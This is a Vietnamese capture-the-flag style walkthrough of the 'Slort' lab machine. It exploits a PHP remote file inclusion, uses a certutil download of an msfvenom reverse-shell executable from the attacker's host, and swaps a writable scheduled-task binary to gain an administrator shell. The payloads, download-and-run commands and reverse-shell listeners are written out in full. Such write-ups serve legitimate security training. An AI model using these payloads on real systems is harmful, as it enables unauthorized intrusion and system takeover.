# Slort

## Summary

Khai thác lỗ hổng remote file inclusion trong ứng dụng web trên machine này. Sau đó, escalate bằng cách tận dụng các quyền được cấu hình sai trên file thực thi chạy dưới trình lập lịch tác vụ hệ thống.

## Enumeration

### Nmap

Bắt đầu bằng cách quét `nmap` trên tất cả các port TCP:

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.68.53 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 11:41 EST
Nmap scan report for 192.168.68.53
Host is up (0.16s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
4443/tcp  open  pharos
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 567.34 seconds
```

Tiếp theo, chạy aggressive scan trên các port mở.

```
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.68.53 -A -p21,135,139,445,3306,4443,5040,7680,8080,49664,49665,49667,49668,49669 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 09:32 EST
Nmap scan report for 192.168.68.53
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, TerminalServerCookie, WMSRequest, X11Probe: 
|_    Host '192.168.49.68' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.68.53:4443/dashboard/
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.68.53:8080/dashboard/
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=12/20%Time=5FDF606F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.78'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersio
SF:nBindReqTCP,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(D
SF:NSStatusRequestTCP,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(TerminalServerCookie,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\
SF:.68'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\
SF:x20server")%r(Kerberos,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'
SF:\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20s
SF:erver")%r(X11Probe,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(WMSRequest,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-20T14:32:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.27 seconds
```

Kết quả quét cho thấy đây là target Windows-based. Tập trung vào dịch vụ http-proxy chạy trên cổng 8080.

### Dirb

Browsing port 8080 (http://192.168.68.53:8080/dashboard/) hiển thị trang chủ XAMPP mặc định. Thử brute-force các thư mục trên target.

```
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.68.53:8080  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec 19 11:52:55 2020
URL_BASE: http://192.168.68.53:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.68.53:8080/ ----
...                                             
                                                                                                         
---- Entering directory: http://192.168.68.53:8080/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                         
---- Entering directory: http://192.168.68.53:8080/site/ ----
+ http://192.168.68.53:8080/site/aux (CODE:403|SIZE:1045)                                                
+ http://192.168.68.53:8080/site/com1 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/com2 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/com3 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/con (CODE:403|SIZE:1045)                                                
==> DIRECTORY: http://192.168.68.53:8080/site/css/                                                       
==> DIRECTORY: http://192.168.68.53:8080/site/fonts/                                                     
==> DIRECTORY: http://192.168.68.53:8080/site/images/                                                    
==> DIRECTORY: http://192.168.68.53:8080/site/Images/                                                    
+ http://192.168.68.53:8080/site/index.php (CODE:301|SIZE:27)                                            
==> DIRECTORY: http://192.168.68.53:8080/site/js/                                                        
+ http://192.168.68.53:8080/site/lpt1 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/lpt2 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/nul (CODE:403|SIZE:1045)                                                
+ http://192.168.68.53:8080/site/prn (CODE:403|SIZE:1045)                                                
                                                                                                         
---- Entering directory: http://192.168.68.53:8080/dashboard/de/ ----
+ http://192.168.68.53:8080/dashboard/de/aux (CODE:403|SIZE:1045)        
^C> Testing: http://192.168.68.53:8080/dashboard/de/cgi-win
```

Tập trung vào trang web chạy từ thư mục `/site`.

## Exploitation

### Remote File Inclusion Vulnerability

Điều hướng đến http://192.168.68.53:8080/site/ sẽ chuyển hướng đến http://192.168.68.53:8080/site/index.php?page=main.php. Một thử nghiệm đơn giản về tham số `page` cho thấy có lỗ hổng file inclusion tiềm ẩn.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=hola                            
<br />
<b>Warning</b>:  include(hola): failed to open stream: No such file or directory in <b>C:\xampp\htdocs\site\index.php</b> on line <b>4</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'hola' for inclusion (include_path='C:\xampp\php\PEAR') in <b>C:\xampp\htdocs\site\index.php</b> on line <b>4</b><br />
```

Xác định xem lỗ hổng có cho phép đưa remote file vào không. Hướng tham số dễ bị tấn công đến machine tấn công đang chạy trình lắng nghe netcat trên cổng 80.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/hola
```

Nhận được kết nối trên trình lắng nghe, xác nhận lỗ hổng remote file inclusion.

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvp 80                                                                                 
listening on [any] 80 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49709
GET /hola HTTP/1.0
Host: 192.168.49.68
Connection: close
```

Để xác nhận rằng có thể thực thi code từ xa, tạo một tệp `info.php` trên máy tấn công và serve nó từ máy chủ web Python trên cổng 80.

```
┌──(kali㉿kali)-[~]
└─$ cat info.php
<?php
phpinfo();
?>
```

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Điều hướng đến file `info.php` được host sẽ xác nhận rằng code đang được thực thi trên target.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/info.php
...
</table>
<table>
<tr class="h"><th>PHP Quality Assurance Team</th></tr>
<tr><td class="e">Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra, Stanislav Malyshev, Julien Pauli, Stephen Zarkos, Anatol Belski, Remi Collet, Ferenc Kovacs </td></tr>
</table>
<table>
<tr class="h"><th colspan="2">Websites and Infrastructure team</th></tr>
<tr><td class="e">PHP Websites Team </td><td class="v">Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen, Peter Cowburn, Adam Harvey, Ferenc Kovacs, Levi Morrison </td></tr>
<tr><td class="e">Event Maintainers </td><td class="v">Damien Seguy, Daniel P. Brown </td></tr>
<tr><td class="e">Network Infrastructure </td><td class="v">Daniel P. Brown </td></tr>
<tr><td class="e">Windows Infrastructure </td><td class="v">Alex Schoenmaker </td></tr>
</table>
<h2>PHP License</h2>
<table>
<tr class="v"><td>
<p>
This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file:  LICENSE
</p>
<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</p>
<p>If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.
</p>
</td></tr>
</table>
</div></body></html>
```

Bây giờ đã xác nhận target dễ bị tấn công RFI và biết rằng có thể thực thi mã tùy ý, tạo một chương trình thực thi reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=445 -f exe > shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Code PHP sau đây sẽ tải shell xuống target:

```
┌──(kali㉿kali)-[~]
└─$ cat pwn.php
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/shell.exe" shell.exe', $val);
?>
```

Thực thi script PHP và thực hiện tải xuống.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php                
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
```

Thông báo log máy chủ web chỉ ra rằng target đã tải xuống file.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.68.53 - - [19/Dec/2020 13:03:55] "GET /info.php HTTP/1.0" 200 -
192.168.68.53 - - [19/Dec/2020 13:05:49] "GET /info.php HTTP/1.0" 200 -
192.168.68.53 - - [19/Dec/2020 13:09:48] "GET /pwn.php HTTP/1.0" 200 -
192.168.68.53 - - [19/Dec/2020 13:09:51] "GET /shell.exe HTTP/1.1" 200 -
192.168.68.53 - - [19/Dec/2020 13:09:52] "GET /shell.exe HTTP/1.1" 200 -
```

Bây giờ có thể sửa đổi tệp `pwn.php` để thực thi reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ cat pwn.php 
<?php
$exec = system('shell.exe', $val);
?>
```

Khởi động trình lắng nghe netcat trên cổng 445, sau đó kích hoạt reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
```

Listener cho biết đã nhận được shell.

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvvp 445
listening on [any] 445 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49719
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\site>
```

## Escalation

### Local enumeration

Bây giờ đã có foothold, escalate pivileges. Nhận thấy rằng thư mục `C://Backup/` có thể ghi được.

```
C:\xampp\htdocs\site>cd C:\\
cd C:\\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\

06/12/2020  07:45 AM    <DIR>          Backup
06/12/2020  07:34 AM    <DIR>          PerfLogs
06/12/2020  06:55 AM    <DIR>          Program Files
10/06/2019  07:52 PM    <DIR>          Program Files (x86)
06/12/2020  07:02 AM    <DIR>          Users
06/12/2020  07:41 AM    <DIR>          Windows
06/12/2020  08:11 AM    <DIR>          xampp
               0 File(s)              0 bytes
               7 Dir(s)  28,603,662,336 bytes free

C:\>icacls Backup
icacls Backup
Backup BUILTIN\Users:(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       NT AUTHORITY\Authenticated Users:(I)(M)
       NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\>
```

Ngoài ra, còn tìm thấy một file thú vị `C://Backup/info.txt` chứa thông tin về một tác vụ đã lên lịch.

```
C:\>cd Backup && dir
cd Backup && dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

06/12/2020  07:45 AM    <DIR>          .
06/12/2020  07:45 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/12/2020  07:45 AM            26,112 TFTP.EXE
               3 File(s)         37,489 bytes
               2 Dir(s)  28,603,658,240 bytes free

C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
C:\Backup>
```

Theo file text này, `TFTP.EXE` được chạy mỗi năm phút. Mặc dù không biết chắc điều này có đúng không, nhưng đáng để điều tra vì file thực thi có khả năng được chạy như một tác vụ quản trị.

### Swapping the Executable

Thử thay thế `TFTP.EXE` bằng một file thực thi độc hại. Đầu tiên, tạo payload.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=3306 -f exe > evil.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Trong user shell, tận dụng máy chủ web python đang chạy để tải dữ liệu xuống target.

```
C:\Backup>certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
```

Sao lưu file `TFTP.EXE` gốc...

```
C:\Backup>move TFTP.EXE TFTP.EXE_BKP
move TFTP.EXE TFTP.EXE_BKP
        1 file(s) moved.
```

...và thay thế `TFTP.EXE` bằng file mới.

```
C:\Backup>move evil.exe TFTP.EXE
move evil.exe TFTP.EXE
        1 file(s) moved.
```

Cuối cùng, khởi động trình lắng nghe netcat trên cổng 3306 và đợi tối đa 5 phút để hoạt động.

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvvp 3306                                                              
listening on [any] 3306 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49729
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
slort\administrator
```

Sau một thời gian, nhận được một shell trong trình lắng nghe và phát hiện ra rằng giả định là đúng: file được thực thi với tư cách là Administrator. Có một admin shell!